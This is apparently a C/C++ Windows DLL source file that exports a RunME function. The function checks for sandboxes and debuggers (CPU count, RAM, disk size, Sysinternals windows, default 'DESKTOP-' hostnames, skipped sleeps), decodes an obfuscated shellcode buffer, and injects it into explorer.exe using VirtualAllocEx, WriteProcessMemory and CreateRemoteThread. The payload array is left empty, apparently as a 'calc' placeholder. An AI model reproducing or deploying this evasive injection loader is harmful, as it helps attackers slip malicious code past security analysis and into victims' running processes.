#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

DWORD GetProcessIdByName(const char * processName) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_stricmp(entry.szExeFile, processName) == 0)
			{
				CloseHandle(snapshot);
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
} 

BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
{
	WCHAR windowTitle[1024];
	GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
	CharUpperW(windowTitle);
	if (wcsstr(windowTitle, L"SYSINTERNALS")) *(PBOOL)parameter = true;
	return true;
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 4) return false;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 4000) return false;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 50) return false;

	bool debugged = false;
	EnumWindows(EnumWindowsProc, (LPARAM)(&debugged));
	if (debugged) return false;

    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    GetComputerNameW(computerName, &computerNameLength);
    CharUpperW(computerName);
    if (wcsstr(computerName, L"DESKTOP-")) return false;

    const char calc_payload[] = { };
	unsigned int calc_len = sizeof(calc_payload);

    DWORD pid = GetProcessIdByName("explorer.exe");

    ULONGLONG uptimeBeforeSleep = GetTickCount();
    typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * 100000; // 100 seconds
    pNtDelayExecution(FALSE, &delay);
    ULONGLONG uptimeAfterSleep = GetTickCount();
    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;

	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * calc_len * 2);
	memcpy(encoded, calc_payload, calc_len);

	unsigned char* decoded = encoded;
    
    for (int i = 0; i < sizeof calc_payload; i++) {
              unsigned int ia = (unsigned int)(((char*)decoded)[i]) - 24;
              (((char*)decoded)[i]) = (byte)(ia & 0xFF);
	}

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, calc_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, decoded, calc_len, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
    }
}